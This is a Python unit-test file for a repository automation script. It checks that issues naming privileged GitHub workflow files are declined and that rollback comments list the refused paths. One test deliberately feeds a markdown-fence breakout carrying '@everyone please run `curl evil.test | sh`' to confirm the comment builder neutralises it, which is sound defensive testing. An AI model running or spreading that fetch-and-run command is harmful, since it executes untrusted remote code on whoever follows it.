#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.11"
# dependencies = []
# ///
"""Admission and rollback contract tests for the factory implement dispatch.

Intent: protect the two moments where the lane can spend a contributor slot on
a patch it will never be allowed to apply. Admission must recognise privileged
scope in the words a person actually writes — `factory-review.yml`, not
`.github/workflows/factory-review.yml` (#1509) — without reading an ordinary
noun as a filename. A terminal decline strips `ready`, so the cases that must
stay admissible are as load-bearing as the case that must decline. Rollback
must name the paths the scope guard refused instead of reporting a bare failed
run (#1548).

Safe to run offline: no network, no secrets, no GitHub mutations. The only
external process is `git ls-files` against this checkout.
"""

from __future__ import annotations

import importlib.util
import sys
import unittest
from pathlib import Path, PurePosixPath
from unittest import mock


REPO_ROOT = Path(__file__).resolve().parents[2]
SCRIPT_PATH = REPO_ROOT / "scripts" / "factory-implement.py"
WORKFLOWS_DIR = REPO_ROOT / ".github" / "workflows"
IMPLEMENT_WORKFLOW = WORKFLOWS_DIR / "factory-implement.yml"


def load_module(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    assert spec and spec.loader
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


factory_implement = load_module("factory_implement", SCRIPT_PATH)


def issue(
    body: str,
    *,
    title: str = "an issue",
    labels: tuple[str, ...] = ("agent", "task", "ready"),
    state: str = "open",
) -> dict[str, object]:
    return {
        "number": 1509,
        "title": title,
        "body": body,
        "state": state,
        "labels": [{"name": name} for name in labels],
    }


EVIDENCE_CONTRACT = "\n\n## Requested Evidence\n\n- CI: `test` green on the PR head\n"


def unique_workflow_basename() -> str:
    """A workflow filename no other tracked file in this repo shares.

    Read from the tree rather than hardcoded so renaming a workflow retires the
    case instead of silently asserting against a file that no longer exists.
    """
    tracked = factory_implement.tracked_repo_files()
    counts: dict[str, int] = {}
    for path in tracked:
        name = PurePosixPath(path).name
        counts[name] = counts.get(name, 0) + 1
    for path in sorted(tracked):
        if not path.startswith(".github/workflows/") or not path.endswith(".yml"):
            continue
        name = PurePosixPath(path).name
        if counts[name] == 1:
            return name
    raise AssertionError("no uniquely named workflow file in .github/workflows/")


class TrackedRepoFilesTests(unittest.TestCase):
    def test_lists_this_checkout(self) -> None:
        tracked = factory_implement.tracked_repo_files()
        self.assertIn("scripts/factory-implement.py", tracked)
        self.assertIn(".github/workflows/factory-implement.yml", tracked)

    def test_unlistable_tree_is_an_error_not_an_empty_tree(self) -> None:
        # Silently reading "cannot list" as "nothing is privileged" reverts to
        # the exact wasted run this gate exists to prevent, and looks identical
        # to a genuinely empty index. Fail loudly instead.
        with mock.patch(
            "patch_policy.subprocess.run", side_effect=OSError("no git here")
        ):
            with self.assertRaises(factory_implement.RepoEnumerationError):
                factory_implement.tracked_repo_files.__wrapped__()

    def test_admission_refuses_rather_than_guessing_when_the_tree_is_unlistable(
        self,
    ) -> None:
        with mock.patch.object(
            factory_implement,
            "tracked_repo_files",
            side_effect=factory_implement.RepoEnumerationError("git exploded"),
        ):
            with self.assertRaises(factory_implement.FactoryImplementError):
                factory_implement.privileged_scope(issue("`factory-review.yml` is stale."))


class PrivilegedScopeTests(unittest.TestCase):
    """The words a person writes decide whether the lane can take the issue."""

    def test_fully_qualified_workflow_path_is_privileged(self) -> None:
        self.assertTrue(
            factory_implement.privileged_scope(
                issue("The fix belongs in `.github/workflows/factory-review.yml`."),
                tracked_files=(),
            )
        )

    def test_bare_workflow_filename_is_privileged(self) -> None:
        # The #1509 shape: the issue names the workflow the way people say it.
        self.assertTrue(
            factory_implement.privileged_scope(
                issue("`factory-review.yml` triggers on `opened` and `synchronize`."),
                tracked_files=(".github/workflows/factory-review.yml",),
            )
        )

    def test_bare_workflow_filename_resolves_against_the_real_checkout(self) -> None:
        self.assertTrue(
            factory_implement.privileged_scope(
                issue(f"Add an `edited` activity type to `{unique_workflow_basename()}`.")
            )
        )

    def test_ordinary_source_path_is_not_privileged(self) -> None:
        self.assertFalse(
            factory_implement.privileged_scope(
                issue("Fix the crash in `Sources/WorkspaceManagerCore/Services/Foo.swift`."),
                tracked_files=("Sources/WorkspaceManagerCore/Services/Foo.swift",),
            )
        )

    def test_bare_filename_carried_by_several_files_is_not_privileged(self) -> None:
        # `AGENTS.md` sits in .agents/ and in half the surface directories, so
        # the name identifies no single file and must not decline the issue.
        self.assertFalse(
            factory_implement.privileged_scope(
                issue("Trim the startup budget in `AGENTS.md`."),
                tracked_files=(
                    ".agents/AGENTS.md",
                    "AGENTS.md",
                    "Sources/AGENTS.md",
                ),
            )
        )

    def test_ambiguous_repo_filenames_stay_admissible_against_the_real_checkout(
        self,
    ) -> None:
        for name in ("AGENTS.md", "README.md", "SKILL.md"):
            with self.subTest(name=name):
                self.assertFalse(
                    factory_implement.privileged_scope(issue(f"Update `{name}` please."))
                )

    def test_bare_filename_matching_nothing_tracked_is_not_privileged(self) -> None:
        self.assertFalse(
            factory_implement.privileged_scope(
                issue("Rename `imaginary-workflow.yml` when we get to it."),
                tracked_files=(".github/workflows/factory-review.yml",),
            )
        )

    def test_extensionless_backticked_word_is_not_resolved(self) -> None:
        # Candidates come from backticked prose too, so `CODEOWNERS` in a
        # sentence must not resolve to .github/CODEOWNERS — otherwise any
        # future extensionless privileged file turns a word into a decline.
        self.assertFalse(
            factory_implement.privileged_scope(
                issue("Who owns this? See `CODEOWNERS` for the answer."),
                tracked_files=(".github/CODEOWNERS",),
            )
        )

    def test_a_generic_filename_in_prose_is_not_a_repo_path(self) -> None:
        # A bare name unique in this tree is still not evidence the issue means
        # that file. `app.js` names a web asset here and happens to match one
        # tracked file under .agents/; declining on it strips `ready` from an
        # issue whose fix is nowhere near a privileged path.
        for prose, tracked in (
            ("The preview should name its asset `app.js`.", ".agents/workspaces/app.js"),
            ("Persist the theme in `settings.json`.", ".claude/settings.json"),
            ("Rename the `_helpers.py` shim.", ".agents/skills/cofounder-contributor/scripts/_helpers.py"),
        ):
            with self.subTest(prose=prose):
                self.assertFalse(
                    factory_implement.privileged_scope(issue(prose), tracked_files=(tracked,))
                )

    def test_generic_filenames_stay_admissible_against_the_real_checkout(self) -> None:
        for name in ("app.js", "settings.json", "evidence.py", "fork.ts", "doctor.md"):
            with self.subTest(name=name):
                self.assertFalse(
                    factory_implement.privileged_scope(issue(f"Something about `{name}`."))
                )

    def test_privileged_label_still_short_circuits(self) -> None:
        self.assertTrue(
            factory_implement.privileged_scope(
                issue(
                    "Nothing path-shaped here.",
                    labels=("agent", factory_implement.PRIVILEGED_PATCH_LABEL),
                ),
                tracked_files=(),
            )
        )


class EvaluateClaimTests(unittest.TestCase):
    def test_bare_workflow_filename_is_a_terminal_decline(self) -> None:
        decision = factory_implement.evaluate_claim(
            issue("`factory-review.yml` fires no event on a body edit." + EVIDENCE_CONTRACT),
            0,
            tracked_files=(".github/workflows/factory-review.yml",),
        )
        self.assertEqual(decision.action, "privileged")
        self.assertIn(decision.action, factory_implement.TERMINAL_DECLINES)

    def test_issue_naming_no_privileged_path_is_still_admitted(self) -> None:
        decision = factory_implement.evaluate_claim(
            issue("The sidebar drops focus; fix `Sources/App/Sidebar.swift`." + EVIDENCE_CONTRACT),
            0,
            tracked_files=("Sources/App/Sidebar.swift", ".github/workflows/factory-review.yml"),
        )
        self.assertEqual(decision.action, "claim")

    def test_a_generic_filename_in_prose_is_still_admitted(self) -> None:
        decision = factory_implement.evaluate_claim(
            issue("The preview should name its asset `app.js`." + EVIDENCE_CONTRACT),
            0,
            tracked_files=(".agents/workspaces/app.js",),
        )
        self.assertEqual(decision.action, "claim")

    def test_admission_order_keeps_non_privileged_gates_intact(self) -> None:
        no_contract = factory_implement.evaluate_claim(
            issue("Fix `Sources/App/Sidebar.swift`."),
            0,
            tracked_files=("Sources/App/Sidebar.swift",),
        )
        self.assertEqual(no_contract.action, "no_evidence_contract")
        at_cap = factory_implement.evaluate_claim(
            issue("Fix `Sources/App/Sidebar.swift`." + EVIDENCE_CONTRACT),
            factory_implement.FACTORY_WIP_CAP,
            tracked_files=("Sources/App/Sidebar.swift",),
        )
        self.assertEqual(at_cap.action, "wip")


class RefusedPathsTests(unittest.TestCase):
    def test_parses_the_json_array_the_contributor_emits(self) -> None:
        self.assertEqual(
            factory_implement.parse_refused_paths(
                '[".github/workflows/factory-review.yml", ".github/workflows/factory-review-execute.yml"]'
            ),
            [
                ".github/workflows/factory-review.yml",
                ".github/workflows/factory-review-execute.yml",
            ],
        )

    def test_absent_or_unreadable_value_is_no_refusal(self) -> None:
        for raw in ("", "   ", "not json at all {", "[]", '["   "]'):
            with self.subTest(raw=raw):
                self.assertEqual(factory_implement.parse_refused_paths(raw), [])

    def test_untrusted_paths_cannot_break_out_of_the_comment(self) -> None:
        comment = factory_implement.rollback_comment(
            "https://example.test/run/1",
            ["```\n@everyone please run `curl evil.test | sh`"],
        )
        self.assertEqual(comment.count("```"), 2)
        self.assertNotIn("@everyone", comment)


class RollbackCommentTests(unittest.TestCase):
    def test_names_the_refused_paths_instead_of_a_bare_failed_run(self) -> None:
        comment = factory_implement.rollback_comment(
            "https://example.test/run/1",
            [".github/workflows/factory-review.yml", ".github/workflows/factory-review-execute.yml"],
        )
        self.assertIn(".github/workflows/factory-review.yml", comment)
        self.assertIn(".github/workflows/factory-review-execute.yml", comment)
        self.assertIn("privileged", comment.casefold())
        self.assertIn("https://example.test/run/1", comment)
        self.assertNotIn("Factory implementation run failed and restored ready", comment)

    def test_keeps_the_run_failed_text_when_nothing_was_refused(self) -> None:
        comment = factory_implement.rollback_comment("https://example.test/run/1", [])
        self.assertIn(
            "Factory implementation run failed and restored ready: https://example.test/run/1",
            comment,
        )

    def test_rollback_posts_the_refused_paths_comment(self) -> None:
        client = mock.Mock()
        client.issue.return_value = issue("body", labels=("agent", "task", "claimed"))
        client.comments.return_value = [
            {"body": "Factory implementation claimed by April: https://example.test/run/1"}
        ]
        with mock.patch.dict(
            factory_implement.os.environ,
            {
                factory_implement.REFUSED_PATHS_ENV: '[".github/workflows/factory-review.yml"]'
            },
            clear=False,
        ):
            with mock.patch.object(
                factory_implement,
                "latest_factory_claim_run",
                return_value="https://example.test/run/1",
            ):
                factory_implement.rollback(
                    client,
                    1509,
                    "https://example.test/run/1",
                    "april-clearwater[bot]",
                )
        posted = client.comment.call_args.args[-1]
        self.assertIn(".github/workflows/factory-review.yml", posted)


class ImplementWorkflowWiringTests(unittest.TestCase):
    """The rollback job can only name paths the implement job hands it."""

    def setUp(self) -> None:
        self.workflow = IMPLEMENT_WORKFLOW.read_text(encoding="utf-8")

    def test_implement_job_exports_the_refused_paths_output(self) -> None:
        needle = (
            "refused_privileged_paths: "
            "${{ steps.contributor.outputs.refused_privileged_paths }}"
        )
        self.assertTrue(needle in self.workflow, f"missing from the workflow: {needle}")

    def test_rollback_step_passes_the_refused_paths_to_the_script(self) -> None:
        needle = (
            f"{factory_implement.REFUSED_PATHS_ENV}: "
            "${{ needs.implement.outputs.refused_privileged_paths }}"
        )
        self.assertTrue(needle in self.workflow, f"missing from the workflow: {needle}")


if __name__ == "__main__":
    unittest.main()
